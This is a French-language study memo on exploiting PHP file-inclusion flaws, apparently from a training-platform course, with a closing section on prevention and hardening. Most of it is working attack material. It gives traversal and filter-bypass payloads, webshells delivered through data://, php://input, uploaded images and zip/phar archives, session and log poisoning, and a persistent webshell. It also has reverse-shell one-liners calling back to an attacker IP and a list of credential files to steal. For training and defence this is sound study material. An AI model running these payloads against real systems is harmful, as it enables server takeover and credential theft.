---
tags: [web, lfi, rfi, file-inclusion, php, rce, htb]
source: HTB Academy — File Inclusion
date: 2026-07-24
---

# File Inclusion — Mémo complet (LFI / RFI → RCE)

> [!abstract] Principe fondamental
> Une vulnérabilité de type *File Inclusion* apparaît dès qu'une entrée utilisateur influence le chemin passé à une fonction de chargement de fichier. Selon la fonction, le résultat va de la **lecture arbitraire** à l'**exécution de code à distance**.

---

## 1. Fondations

### 1.1 Le pattern vulnérable

```php
// PHP
include($_GET['language']);
include("./languages/" . $_GET['language']);   // préfixe répertoire
include("lang_" . $_GET['language']);          // préfixe nom de fichier
include($_GET['language'] . ".php");           // extension appendue
```

```javascript
// NodeJS
fs.readFile(path.join(__dirname, req.query.language), ...)
res.render(`/${req.params.language}/about.html`)   // paramètre dans le PATH, pas la query
```

```jsp
<!-- Java -->
<jsp:include file="<%= request.getParameter('language') %>" />
<c:import url="<%= request.getParameter('language') %>"/>
```

```csharp
// .NET
Response.WriteFile("<% HttpContext.Request.Query['language'] %>");
@Html.Partial(HttpContext.Request.Query['language'])
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

### 1.2 Tableau read / execute / remote — LA table de référence

C'est elle qui détermine ton plafond d'exploitation. À connaître par cœur.

| Fonction | Lit | **Exécute** | URL distante |
|---|:---:|:---:|:---:|
| **PHP** | | | |
| `include()` / `include_once()` | ✅ | ✅ | ✅ |
| `require()` / `require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()` / `file()` | ✅ | ❌ | ❌ |
| **NodeJS** | | | |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** | | | |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** | | | |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` (SSI) | ✅ | ✅ | ✅ |

**Conséquences pratiques :**
- Colonne *Exécute* = ❌ → tu obtiens directement le code source, pas besoin de `php://filter`
- Colonne *Exécute* = ✅ → le PHP est interprété, il faut un filtre pour lire le source
- Colonne *URL distante* = ✅ → RFI et SSRF possibles
- `include()` coche les trois cases → c'est la fonction la plus exploitable

### 1.3 Fichiers témoins pour valider une LFI

| OS | Fichier | Bonus |
|---|---|---|
| Linux | `/etc/passwd` | liste des utilisateurs |
| Linux | `/etc/hostname`, `/etc/hosts` | discrets, taille faible |
| Windows | `C:\Windows\win.ini` | moderne |
| Windows | `C:\Windows\System32\drivers\etc\hosts` | |
| Windows | `C:\Windows\boot.ini` | systèmes anciens |

---

## 2. Caractériser le contexte d'injection

> [!important] Étape à ne jamais sauter
> Avant tout payload, détermine **où atterrit ton input** dans la chaîne finale. C'est ça qui dicte la technique.

| Test | Résultat | Conclusion |
|---|---|---|
| `?p=/etc/passwd` | ✅ | input pur, pas de préfixe |
| `?p=/etc/passwd` ❌ mais `?p=../../../etc/passwd` ✅ | | préfixe de répertoire |
| `?p=/../../../etc/passwd` ✅ | | préfixe de nom de fichier (`lang_`) |
| `?p=en` ✅ mais `?p=en.php` ❌ | | **extension appendue** |

### Impact du contexte sur les techniques

| Contexte | Traversal | `php://filter` | Wrappers RCE | RFI |
|---|:---:|:---:|:---:|:---:|
| Input pur | ✅ | ✅ | ✅ | ✅ |
| Préfixe répertoire | ✅ | ✅ | ✅ | ✅ |
| **Préfixe nom de fichier** | ⚠️ | ❌ | ❌ | ❌ |
| Extension appendue | ✅ | ✅ (`resource=` en fin) | ❌ | ❌ |

> [!warning] Le préfixe tue les wrappers
> `include("lang_" . $input)` → `lang_php://filter/...` n'est pas un schéma valide. Un wrapper **doit** commencer la chaîne.

---

## 3. Path traversal & contournements de filtres

### 3.1 Traversal de base

```
../../../../etc/passwd
```

- Une fois à `/`, les `../` en trop ne cassent rien → tu peux en spammer
- Fonctionne aussi sans préfixe → **payload par défaut**
- Pour un rapport propre : trouve le nombre minimal (`/var/www/html` = 3)

### 3.2 Filtre non récursif (`str_replace('../', '', $input)`)

Le filtre passe une seule fois → construis une chaîne qui *devient* `../` après suppression :

```
....//....//....//etc/passwd
..././..././etc/passwd
....\/....\/etc/passwd
....////....////etc/passwd
```

> Parade côté défense : boucle `while` jusqu'à point fixe, ou mieux : `realpath()` + vérification de préfixe.

### 3.3 Encodage

```
../          →  %2e%2e%2f
double       →  %252e%252e%252f
```

- **Encoder les points aussi** (beaucoup d'outils les laissent intacts)
- Efficace quand le filtre inspecte *avant* le décodage URL
- Double encodage utile s'il y a un décodage intermédiaire (proxy, framework)

### 3.4 Chemin autorisé (regex de préfixe)

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) { include($_GET['language']); }
```

Tu **satisfais** le contrôle au lieu de le contourner :

```
./languages/../../../../etc/passwd
```

### 3.5 Combinaison de filtres

```
./languages/....//....//....//....//flag.txt
```

Préfixe autorisé (regex) + payload récursif (`str_replace`).

### 3.6 Extension appendue — techniques historiques

> [!caution] Obsolètes sur PHP moderne
> À connaître pour les cibles legacy et les CTF.

**Null byte** (PHP < 5.3.4) :
```
/etc/passwd%00
```

**Path truncation** (PHP < 5.3) — chaînes tronquées à 4096 caractères :
```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

Sur PHP moderne : pas de contournement, mais `php://filter` reste utilisable.

---

## 4. Lecture de code source — `php://filter`

> [!tip] La technique la plus universelle du module
> Ne dépend d'**aucun** réglage PHP. Fonctionne sur toutes les versions.

### 4.1 Le problème

`include()` **exécute** le PHP au lieu de l'afficher → page vide sur un `config.php`.

### 4.2 La solution

```
php://filter/convert.base64-encode/resource=config
php://filter/read=convert.base64-encode/resource=config    (syntaxe longue)
```

Le flux est encodé **avant** l'analyseur PHP → plus de balise `<?php` reconnue → contenu recraché tel quel.

> [!note] `resource=` toujours en dernier
> Si l'appli appende `.php`, la chaîne devient `...resource=config.php` → l'extension complète le nom de fichier au lieu de casser le payload.

### 4.3 Pipeline d'extraction

```bash
curl -s "http://CIBLE/index.php?language=php://filter/convert.base64-encode/resource=config" \
  | grep -oP '[A-Za-z0-9+/=]{40,}' | base64 -d
```

| Élément | Rôle |
|---|---|
| `-s` | supprime la barre de progression |
| `grep -o` | n'affiche que la portion correspondante |
| `-P` | moteur PCRE |
| `[A-Za-z0-9+/=]` | alphabet base64 exact |
| `{40,}` | ≥ 40 caractères consécutifs → élimine le HTML environnant |

**Si plusieurs blocs, garder le plus long :**
```bash
curl -s "URL" | grep -oP '[A-Za-z0-9+/=]{40,}' \
  | awk '{print length, $0}' | sort -rn | head -1 | cut -d' ' -f2- | base64 -d
```

### 4.4 Filtres alternatifs (si `base64` blacklisté)

```
php://filter/string.rot13/resource=config
php://filter/convert.iconv.utf-8.utf-16le/resource=config
php://filter/string.rot13|convert.base64-encode/resource=config   (chaînage avec |)
```

> [!info] PHP filter chains (Synacktiv, 2023)
> En enchaînant des dizaines de `convert.iconv`, il est possible de **générer** du contenu arbitraire dans le flux → RCE depuis un simple `include()`, sans aucun fichier ni réglage. État de l'art actuel, hors périmètre du module.
> Outil : `synacktiv/php_filter_chain_generator`

### 4.5 Contourner les gardes-fous PHP

```php
// Ce type de protection ne sert à RIEN face à php://filter
if (realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}
```

**Raison :** c'est du code PHP, il ne s'exécute que si le fichier est exécuté. Avec un filtre, il ne l'est jamais.

> Une protection écrite dans le langage du fichier qu'elle protège ne survit pas à une primitive de lecture arbitraire.

---

## 5. RCE via wrappers PHP

> [!warning] Prérequis : `allow_url_include = On`
> Déprécié en PHP 7.4, **retiré en PHP 8.0**. Très présent en CTF et sur du legacy, absent d'une cible moderne.

### 5.1 Vérifier la configuration

```bash
curl -s "http://CIBLE/index.php?language=php://filter/convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" \
  | grep -oP '[A-Za-z0-9+/=]{40,}' | base64 -d \
  | grep -E 'allow_url_include|allow_url_fopen|disable_functions|open_basedir|extension=expect'
```

Chemins du `php.ini` :
```
/etc/php/X.Y/apache2/php.ini     (Apache / mod_php)
/etc/php/X.Y/fpm/php.ini         (Nginx / PHP-FPM)
/etc/php/X.Y/cli/php.ini         (⚠ CLI, différent d'Apache !)
```

Tester `8.3`, `8.2`, `8.1`, `7.4`, `7.2`.

**Les deux réglages à distinguer :**
| Réglage | Défaut | Autorise |
|---|---|---|
| `allow_url_fopen` | On | `file_get_contents("http://…")` → SSRF |
| `allow_url_include` | Off | `include("http://…")` → RFI / `data://` / `php://input` |

### 5.2 `data://` — webshell inline

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

```bash
curl -s 'http://CIBLE/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
```

> [!danger] Encoder le base64 en URL
> `+` → `%2B` · `=` → `%3D` · `/` → `%2F`
> Sans ça, `+` est interprété comme un espace et le payload est corrompu.

### 5.3 `php://input` — payload dans le corps POST

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://CIBLE/index.php?language=php://input&cmd=id"
```

**Avantages sur `data://` :**
- Aucun encodage à gérer
- **Discrétion** : Apache ne journalise que la ligne de requête, jamais le corps → le webshell n'apparaît pas dans `access.log`

Si l'appli n'accepte que le POST (pas de `$_REQUEST`), commande en dur :
```bash
curl -s -X POST --data '<?php system("ls /"); ?>' "http://CIBLE/index.php?language=php://input"
```

**Ce qui se passe côté serveur :**
```
1. include("php://input")
2. PHP ouvre le flux → contenu = corps brut de la requête (en mémoire)
3. include() passe le flux à l'analyseur PHP
4. system() lance /bin/sh -c "..." sous l'identité www-data
5. La sortie part dans le corps de la réponse HTTP
```
Rien n'est jamais écrit sur le disque.

### 5.4 `expect://` — exécution directe

```bash
curl -s "http://CIBLE/index.php?language=expect://id"
```

Extension PECL externe, rarement installée. Voir `extension=expect` dans le `php.ini` prouve seulement que le serveur *tente* de la charger — seul le test direct confirme.

---

## 6. Remote File Inclusion (RFI)

### 6.1 Vérifier

Toujours commencer par une **URL locale** (évite le pare-feu sortant) :

```
?language=http://127.0.0.1:80/about.php
```

- La page s'affiche → les URL passent, RFI confirmée
- Elle s'affiche **rendue** (pas en source) → la fonction exécute → RCE possible

> [!caution] Ne jamais inclure la page vulnérable elle-même
> `?language=http://127.0.0.1/index.php` → boucle d'inclusion récursive → DoS (réponses de plusieurs centaines de Mo).
> C'est aussi un marqueur de LFI confirmée en fuzzing.

### 6.2 HTTP

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server 80
```

```
?language=http://TON_IP/shell.php&cmd=id
```

> [!tip] Les logs de ton serveur = ton meilleur oracle
> ```
> 10.10.10.5 - - [24/Jul/2026] "GET /shell.php.php HTTP/1.0" 404 -
> ```
> - `.php` en trop → l'appli appende l'extension, omets-la (`/shell`)
> - **Aucune requête** → problème réseau (pare-feu sortant) ou wrapper interdit, pas payload

Privilégier les ports **80 / 443** (souvent seuls autorisés en sortie).

### 6.3 FTP

```bash
sudo python3 -m pyftpdlib -p 21
```

```
?language=ftp://TON_IP/shell.php&cmd=id
?language=ftp://user:pass@TON_IP/shell.php&cmd=id
```

Utile pour contourner un WAF filtrant `http://` ou un blocage des ports web sortants.

### 6.4 SMB — le cas Windows

```bash
impacket-smbserver -smb2support share $(pwd)
```

```
?language=\\TON_IP\share\shell.php&cmd=whoami
```

> [!success] Pas besoin d'`allow_url_include`
> Windows traite un chemin UNC comme un fichier local → la restriction PHP ne s'applique pas.
> **Seule technique RFI encore viable sur une config PHP durcie.**
> Limite : SMB sort rarement vers Internet → nécessite d'être sur le même réseau.

Identifier un back-end Windows : en-tête `Server:`, ou lecture de `C:\Windows\win.ini`.

---

## 7. LFI + Upload de fichiers

> [!success] La technique la plus fiable en pratique
> Aucun réglage PHP requis, aucune connectivité entrante. Fonctionne sur cible moderne durcie.

### 7.1 Principe

Le formulaire d'upload **n'a pas besoin d'être vulnérable** — il suffit qu'il accepte un fichier.

`include()` ne regarde ni l'extension, ni le type MIME, ni les magic bytes. Il ouvre le flux et passe le contenu à l'analyseur PHP.

> [!important] Pourquoi l'accès direct ne marche pas
> `http://cible/uploads/shell.gif?cmd=ls` → **Apache** voit `.gif`, ne convoque pas PHP, sert le fichier tel quel.
> L'extension ne compte que pour Apache. `include()` s'en moque totalement.
> C'est l'inclusion via la LFI qui déclenche l'exécution.

### 7.2 Image piégée (méthode principale)

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Magic bytes par format :
| Format | Signature | Remarque |
|---|---|---|
| GIF | `GIF8` | ASCII pur → le plus simple |
| PDF | `%PDF-1.4` | ASCII, utile pour les formulaires de CV |
| PNG | `\x89PNG\r\n\x1a\n` | binaire |
| JPEG | `\xFF\xD8\xFF` | binaire |

Le préfixe est hors balise PHP → simplement recraché avant l'exécution (tu le verras en tête de sortie, c'est normal et ça confirme que c'est bien ton fichier).

```
?language=./profile_images/shell.gif&cmd=id
```

### 7.3 `zip://`

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```
?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

`%23` = `#` encodé (obligatoire : un `#` brut serait un fragment d'URL, jamais transmis).

### 7.4 `phar://`

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

```
?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

`%2F` = `/` encodé. `phar.readonly=0` est un réglage sur **ta** machine, pas la cible.

> [!info] `phar://` et la désérialisation
> Toute fonction de système de fichiers (`file_exists`, `filesize`, `is_dir`…) recevant un chemin `phar://` désérialise automatiquement les métadonnées → déclenche les *magic methods* d'objets. Vecteur d'exploitation majeur, hors périmètre de ce module.

### 7.5 Trouver le chemin d'upload — 5 méthodes

| # | Méthode | Commande |
|---|---|---|
| 1 | **HTML de la page** | `curl -s "http://CIBLE/settings.php" \| grep -i img` |
| 2 | **Réponse de l'upload** | Burp / onglet Réseau — souvent un JSON avec le chemin |
| 3 | **Code source** ⭐ | `php://filter` sur `upload.php` → cherche `move_uploaded_file()` |
| 4 | **Fuzzer le répertoire** | `ffuf -w common.txt -u "http://CIBLE/FUZZ/shell.gif" -mc 200` |
| 5 | **Fuzzer via la LFI** | `ffuf -w common.txt -u "http://CIBLE/index.php?p=./FUZZ/shell.gif&cmd=id" -mc all -ac` |

> La méthode 3 est décisive quand l'appli **renomme** les fichiers (`md5()`, uuid…) — aucune inspection HTML ne t'aiderait.
> La méthode 5 fonctionne même si le répertoire est protégé en accès direct (`.htaccess Deny from all`), car `include()` lit sur le disque sans repasser par Apache.

Répertoires candidats : `uploads`, `images`, `img`, `files`, `avatars`, `profile_images`, `media`, `assets`, `static`, `documents`, `cv`

> [!note] `accept=".jpg,.png,.gif"` dans le HTML ne filtre RIEN
> C'est purement cosmétique (pré-sélection dans la boîte de dialogue). `curl` et Burp l'ignorent. La vraie validation est dans le script serveur.

---

## 8. Log Poisoning

> [!abstract] Principe
> Écrire du PHP dans un champ que le serveur journalise, puis inclure le fichier de log.
> **Généralisation :** tout fichier où tu peux écrire une valeur contrôlée, et que tu peux lire via la LFI, est un vecteur de RCE.

### 8.1 PHP Session Poisoning

Emplacements :
```
Linux   : /var/lib/php/sessions/sess_<PHPSESSID>
Windows : C:\Windows\Temp\sess_<PHPSESSID>
```

**Démarche :**

```bash
# 1. Récupérer le PHPSESSID
curl -s -i "http://CIBLE/index.php" | grep -i set-cookie

# 2. Lire le fichier de session (chercher un champ contrôlable)
curl -s "http://CIBLE/index.php?language=/var/lib/php/sessions/sess_ID" -b "PHPSESSID=ID"
# → page|s:6:"es.php";preference|s:2:"es";

# 3. Vérifier le contrôle
curl -s "http://CIBLE/index.php?language=session_poisoning" -b "PHPSESSID=ID"

# 4. Empoisonner (webshell URL-encodé)
curl -s "http://CIBLE/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E" -b "PHPSESSID=ID"

# 5. Inclure et exécuter
curl -s "http://CIBLE/index.php?language=/var/lib/php/sessions/sess_ID&cmd=id" -b "PHPSESSID=ID"
```

> [!danger] Le webshell ne survit pas à son propre usage
> ```
> 1. PHP charge la session (webshell présent)
> 2. include() l'exécute → commande OK ✅
> 3. Fin du script : PHP réécrit la session
>    page = "/var/lib/php/sessions/sess_xxx"   ← webshell écrasé
> ```
> → **Une commande par empoisonnement.** Parade : déposer un webshell permanent (§9.1).

Le `-b` est indispensable, sinon PHP crée une nouvelle session à chaque requête.

### 8.2 Server Log Poisoning

| Serveur | Linux | Windows |
|---|---|---|
| Apache | `/var/log/apache2/access.log`<br>`/var/log/apache2/error.log` | `C:\xampp\apache\logs\access.log` |
| Nginx | `/var/log/nginx/access.log` | `C:\nginx\log\access.log` |

| Serveur | Permissions par défaut | Exploitable ? |
|---|---|---|
| **Nginx** | lisible par `www-data` | ✅ généralement |
| **Apache** | `root` / groupe `adm` | ❌ sauf serveur ancien ou mal configuré |

**Empoisonner via le User-Agent :**

```bash
# Via fichier (évite les cauchemars d'échappement)
echo -n 'User-Agent: <?php system($_GET["cmd"]); ?>' > Poison
curl -s "http://CIBLE/index.php" -H @Poison

# En direct
curl -s "http://CIBLE/index.php" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

# Exécuter
curl -s "http://CIBLE/index.php?language=/var/log/apache2/access.log&cmd=id"
```

> [!tip]
> - **N'importe quelle requête est journalisée** — tu peux empoisonner via une requête anodine vers `/`
> - **Les logs sont énormes** → chaque inclusion charge tout le fichier. En production : lent, voire DoS. Sois économe.

### 8.3 `/proc`

```
?language=/proc/self/environ        # contient HTTP_USER_AGENT
?language=/proc/self/fd/N           # N entre 0 et 50
?language=/proc/self/cmdline        # ligne de commande du processus
```

Souvent restreint aux utilisateurs privilégiés, mais gratuit à tester.

### 8.4 Autres services

| Log | Vecteur d'empoisonnement |
|---|---|
| `/var/log/sshd.log`, `/var/log/auth.log` | connexion SSH avec du PHP comme **nom d'utilisateur** |
| `/var/log/vsftpd.log` | idem sur FTP |
| `/var/log/mail`, `/var/log/mail.log` | envoyer un mail contenant du PHP |

---

## 9. Post-exploitation

### 9.1 Webshell permanent (à faire en priorité)

Une fois la première exécution obtenue — surtout en session poisoning où le shell est éphémère :

```
&cmd=echo+'<?php+system($_GET["c"]);+?>'+>+/var/www/html/s.php
```

Puis `http://CIBLE/s.php?c=id` indéfiniment.

### 9.2 Reverse shell

```bash
# Écoute
nc -lvnp 4444

# Payloads (à URL-encoder)
bash -c 'bash -i >& /dev/tcp/TON_IP/4444 0>&1'
nc -e /bin/sh TON_IP 4444
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("TON_IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

Stabiliser :
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 9.3 Si `system()` est désactivé (`disable_functions`)

```php
<?php echo shell_exec("ls /"); ?>
<?php passthru("ls /"); ?>
<?php echo exec("ls /"); ?>
<?php $h=popen("ls /","r"); while(!feof($h)) echo fread($h,1024); ?>
<?php echo implode("\n", scandir("/")); ?>            // aucune fonction shell
<?php echo file_get_contents("/flag.txt"); ?>         // aucune fonction shell
```

Vérifier ce qui est bloqué :
```php
<?php echo ini_get('disable_functions'); ?>
```

### 9.4 Où chercher — checklist de fichiers

**Reconnaissance système**
```
/etc/passwd                     utilisateurs (UID ≥ 1000 + shell valide = comptes réels)
/etc/shadow                     hashes (root seulement)
/etc/hostname  /etc/hosts       nommage, réseau interne
/etc/issue  /etc/os-release     distribution et version
/etc/crontab  /etc/cron.d/*     tâches planifiées → vecteur de persistance/escalade
/proc/version                   version du noyau → recherche d'exploit
/proc/self/environ              variables d'environnement
/proc/net/tcp                   ports en écoute (pivot / SSRF)
```

**Credentials et clés**
```
/home/<user>/.ssh/id_rsa        ⭐ le jackpot — SSH direct
/home/<user>/.ssh/authorized_keys
/home/<user>/.bash_history      ⭐ commandes tapées, souvent des mots de passe
/home/<user>/.bashrc  .profile
/root/.ssh/id_rsa
/var/www/html/.env              ⭐ Laravel / Symfony — DB, API keys
/var/www/html/config.php
/var/www/html/wp-config.php     WordPress
/var/www/html/.git/config       dépôt exposé
/var/www/html/composer.json
```

**Configuration serveur**
```
/etc/apache2/apache2.conf                    DocumentRoot + ${APACHE_LOG_DIR}
/etc/apache2/envvars                         ⭐ valeur des variables Apache
/etc/apache2/sites-enabled/000-default.conf  vhosts, racines alternatives
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/php/X.Y/apache2/php.ini                 allow_url_include, disable_functions, open_basedir
/etc/mysql/my.cnf
```

**Windows**
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\Windows\System32\config\SAM        (verrouillé à chaud)
C:\Users\<user>\.ssh\id_rsa
```

### 9.5 Chaînage de configurations — la méthode qui bat les wordlists

Quand les chemins standards échouent (installation personnalisée, Docker, LAMP compilé) :

```bash
# 1. Configuration Apache
curl -s "http://CIBLE/index.php?language=../../../../etc/apache2/apache2.conf"
```
```apache
DocumentRoot /var/www/html
CustomLog ${APACHE_LOG_DIR}/access.log combined     ← variable, pas un chemin
```

```bash
# 2. Résoudre la variable
curl -s "http://CIBLE/index.php?language=../../../../etc/apache2/envvars"
```
```bash
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
```

```bash
# 3. Recomposer → /var/log/apache2/access.log
```

> [!important] Le réflexe à intérioriser
> **Chaque fichier lu en désigne un autre.** Configuration → variables → chemins → logs → RCE.
> Les wordlists servent à *découvrir* ce qui existe. Les configurations servent à *comprendre* comment le système est agencé.
> Sur une cible standard, la wordlist suffit. Sur une cible personnalisée, seule la lecture en chaîne fonctionne.

Même logique côté applicatif : lire `index.php` → repérer les `include`/`require` → lire les fichiers référencés → recommencer.

---

## 10. Automatisation

### 10.1 Fuzzer les paramètres cachés

> Les paramètres liés aux formulaires HTML sont testés. Ceux qui traînent dans le code sans interface ne le sont jamais.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u 'http://CIBLE/index.php?FUZZ=value' -ic -ac -c
```

Noms les plus fréquents : `file`, `page`, `include`, `path`, `doc`, `view`, `template`, `lang`, `language`, `dir`, `filename`, `load`, `read`, `show`, `content`, `document`

### 10.2 Fuzzer les payloads LFI

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -u 'http://CIBLE/index.php?language=FUZZ' -ic -ac -c
```

### 10.3 Trouver la racine web

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt \
     -u 'http://CIBLE/index.php?language=../../../../FUZZ/index.php' -ic -ac -c
```

### 10.4 Énumérer les fichiers PHP

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u 'http://CIBLE/FUZZ.php' -ic -mc all -ac -c
```

> [!warning] `-mc all` est essentiel
> Avec une LFI tu as une lecture arbitraire — le contrôle d'accès HTTP ne s'applique pas à `include()`.
> Un `config.php` qui renvoie **302** ou **403** se lit parfaitement. C'est souvent celui qui contient les credentials.

### 10.5 Options ffuf indispensables

| Option | Rôle |
|---|---|
| `-ic` | ignore les lignes de commentaire des wordlists (`# Copyright…`) |
| `-ac` | auto-calibration : mesure la réponse « rien trouvé » et la filtre |
| `-mc all` | tous les codes de statut |
| `-fs N` | filtre par taille (si `-ac` est insuffisant) |
| `-fc 400` | élimine les requêtes malformées (entrées avec espaces) |
| `-e .php,.bak,.old` | étend le mot-clé avec des extensions |
| `-w liste:MOTCLE` | associe une liste à un marqueur (utile en multi-listes) |
| `-t 40` | threads |
| `-p 0.1` | délai entre requêtes (discrétion / rate limit) |

**Multi-wordlists :**
```bash
ffuf -w users.txt:USER -w pass.txt:PASS -u http://CIBLE/login \
     -X POST -d 'username=USER&password=PASS'
```

**Calibrer manuellement :**
```bash
curl -s "http://CIBLE/index.php?xyzzy=value" | wc -c    # → taille baseline pour -fs
```

### 10.6 Wordlists

| Usage | Chemin |
|---|---|
| Payloads LFI | `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt` |
| Chemins LFI Linux | `/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt` |
| Paramètres | `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt` |
| Contenu web (curé) | `/usr/share/seclists/Discovery/Web-Content/common.txt` |
| Contenu web (large) | `/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt` |
| Racines web | `/usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt` |

> [!caution] Éviter les listes `DirBuster-2007_*`
> Datées de 2007, mauvais ratio trouvailles/requêtes. Préférer les `raft-*` (issues de crawls réels).

**Installation :**
```bash
sudo apt install -y seclists      # → /usr/share/seclists
```

**Assetnote** — régénérées tous les mois depuis l'HTTP Archive :
```bash
wget https://wordlists-cdn.assetnote.io/data/automated/httparchive_php_2026_02_27.txt
# → chemins terminant par .php, à utiliser tel quel : -u http://CIBLE/FUZZ
```
Catalogue : `wordlists.assetnote.io` — voir aussi `httparchive_parameters_top_1m` pour les paramètres cachés.

### 10.7 Outils dédiés

`LFISuite`, `LFiFreak`, `liffy` — non maintenus, Python 2, précision variable. `ffuf` + `LFI-Jhaddix.txt` reste le standard de fait.

---

## 11. Prévention

### 11.1 Règle fondamentale

> Ne jamais passer d'entrée utilisateur à une fonction d'inclusion.

### 11.2 Liste blanche (quand la refonte est impossible)

```php
$pages = ['en' => 'languages/en.php', 'es' => 'languages/es.php'];
$file = $pages[$_GET['language']] ?? 'languages/en.php';
include($file);
```

L'entrée utilisateur sert de **clé de recherche**, elle n'entre jamais dans `include()`.

### 11.3 Contre le path traversal

```php
// Correct : résoudre PUIS vérifier
$path = realpath($base . '/' . $input);
if ($path === false || strpos($path, realpath($base)) !== 0) {
    die('Chemin interdit');
}

// Acceptable : basename() (mais interdit les sous-répertoires)
$file = basename($_GET['language']);

// Suppression récursive (liste noire — moins robuste)
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

> [!warning] Ne réinvente pas la fonction d'assainissement
> Démonstration :
> ```bash
> cd ~ && cat .?/.*/.?/etc/passwd        # bash développe ? et * en .
> php -a
> echo file_get_contents('.?/.*/.?/etc/passwd');   # PHP ne développe pas
> ```
> Un filtre valide côté PHP peut être contourné dès que la chaîne atteint un shell (via `system()`).
> **Chaque interpréteur traversé a sa propre grammaire.** Préférer les fonctions natives du framework.

### 11.4 Durcissement serveur

| Réglage | Neutralise |
|---|---|
| `allow_url_include = Off` | RFI, `data://`, `php://input` |
| `allow_url_fopen = Off` | SSRF via `file_get_contents()` |
| `open_basedir = /var/www` | ⭐ toute lecture hors racine web — logs, sessions, `/etc/passwd` |
| `disable_functions = system,exec,shell_exec,passthru,popen,proc_open` | exécution de commandes |
| désactiver `expect`, `mod_userdir` | wrapper `expect://` |
| conteneurisation Docker | isolation générale |

`open_basedir` est le plus rentable : il annule d'un coup le log poisoning, le session poisoning et la lecture de configurations.

**Vérifier / appliquer :**
```bash
find /etc/php -name php.ini
grep -n '^disable_functions' /etc/php/*/apache2/php.ini
sudo sed -i 's/^\(disable_functions = .*\)$/\1system/' /etc/php/*/apache2/php.ini
sudo systemctl restart apache2       # ⚠ indispensable, sinon php.ini n'est pas relu
```

> [!note] CLI ≠ Apache
> `php -i | grep "Loaded Configuration File"` donne le `php.ini` du **CLI**.
> Pour tester une directive Apache, il faut passer par une requête HTTP :
> ```bash
> echo '<?php system("id"); ?>' | sudo tee /var/www/html/test.php
> curl http://localhost/test.php
> tail -5 /var/log/apache2/error.log
> ```

### 11.5 WAF

`ModSecurity` — utiliser d'abord le **mode permissif** : journalise ce qu'il aurait bloqué, permet d'ajuster les règles avant le passage en blocage. Même laissé en permissif, il reste un système d'alerte précoce.

> [!quote] Philosophie du durcissement
> Durcir ne rend pas un système inviolable. Ça donne du temps aux défenseurs et ça produit des traces.
> M-Trends 2020 : **30 jours** en moyenne pour détecter une intrusion.
> Face à un zero-day, le durcissement n'empêchera pas l'exploitation, mais générera des journaux distinctifs permettant de savoir *après coup* si la faille a été utilisée.

---

## 12. Méthodologie — checklist opérationnelle

### Phase 1 — Reconnaissance
- [ ] Parcourir l'application manuellement, noter pages / paramètres / formulaires
- [ ] `ffuf` sur les répertoires et sur `FUZZ.php` (avec `-mc all`)
- [ ] Identifier les fonctionnalités **récentes** (les moins auditées)

### Phase 2 — Trouver le point d'injection
- [ ] Fuzzer les paramètres GET sur **chaque page** découverte
- [ ] Tester aussi les paramètres POST (rejouer les formulaires dans Burp)
- [ ] Penser aux paramètres dans le **path** (`/about/en`), pas seulement `?param=`
- [ ] Penser au **second-order** : username, nom de fichier, ID persisté réutilisé dans un chemin

### Phase 3 — Caractériser
- [ ] Préfixe de répertoire ? de nom de fichier ?
- [ ] Extension appendue ?
